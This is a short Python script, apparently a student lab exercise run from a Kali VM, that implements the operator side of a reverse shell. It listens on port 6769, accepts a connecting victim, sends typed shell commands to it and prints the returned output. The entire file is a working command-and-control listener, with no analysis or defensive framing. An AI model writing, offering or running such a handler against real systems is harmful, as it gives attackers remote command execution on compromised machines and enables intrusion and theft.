"""
Adam Braccia
"""

#Server VM: Kali 3999
#Server IP: 192.168.193.113
#Port: 4444

import socket

#HOST = input("Enter your target IP Address: ")
#PORT = input("Enter your target Port: ")

#Local Host and Port of Server
HOST = "0.0.0.0" 
PORT = 6769
print("Trying to connect to client...")
#Make connection with sockets
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print("Connected by", addr)
        #while conected, take input to use as command
        while True:
            cmd = input("command> ")
            if not cmd:
                continue
            conn.sendall(cmd.encode() + b"\n")   # send command
            if cmd.strip().lower() == "exit": #close if exit is the command
                print("Sent exit, closing.")
                break
            # receive result length-unaware: read until socket closed or newline marker
            data = b""
            while True:
                part = conn.recv(4096)
                if not part:
                    break
                data += part
                # client will send a marker line "--END--\n when closed"
                if b"--END--\n" in data:
                    data = data.replace(b"--END--\n", b"")
                    break
            print("=== output ===")
            print(data.decode(errors="ignore"))
       


